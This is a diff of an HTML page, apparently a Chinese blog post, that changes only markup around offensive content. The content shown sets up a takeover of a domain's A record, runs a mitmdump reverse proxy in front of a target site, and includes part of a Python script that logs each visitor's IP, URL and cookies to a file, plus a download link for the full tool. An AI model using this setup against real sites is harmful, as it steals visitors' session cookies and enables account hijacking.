@@ -128,15 +128,16 @@
 <p>3.在域名的新A记录主机上运行:
     <code class="highlighter-rouge">mitmdump --set allow_remote=true -—listen-host 0.0.0.0 -s xdomain.py --mode reverse:http://xxx.xxx.xxx:80 -p 80</code></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>--listen-host代表本地监听ip
+<div class="highlighter-rouge"><pre class="highlight"><code>--listen-host代表本地监听ip
 --mode reverse代表以反向代理的模式进行工作
 --set allow_remote=true代表支持客户端访问的时候是通过代理访问的
 运行时需要需要上面命令中的http://xxx.xxx.xxx:80为目标网站地址,且修改下面代码中的http://xxx.xxx.xxx为目标网站地址
-</code></pre></div></div>
+</code></pre>
+</div>
 
 <h3 id="detail">Detail</h3>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import os
+<div class="highlighter-rouge"><pre class="highlight"><code>import os
 import re
 import chardet
 
@@ -163,7 +164,8 @@ def response(flow):
         return_value = {'ip': ip, 'url': url, 'cookie': cookie}
         with open("mitm.log", "a+") as f:
             f.write(str(return_value) + "\n")
-</code></pre></div></div>
+</code></pre>
+</div>
 
 <p><a href="https://raw.githubusercontent.com/3xp10it/mytools/master/xdomain.py">download</a></p>
 
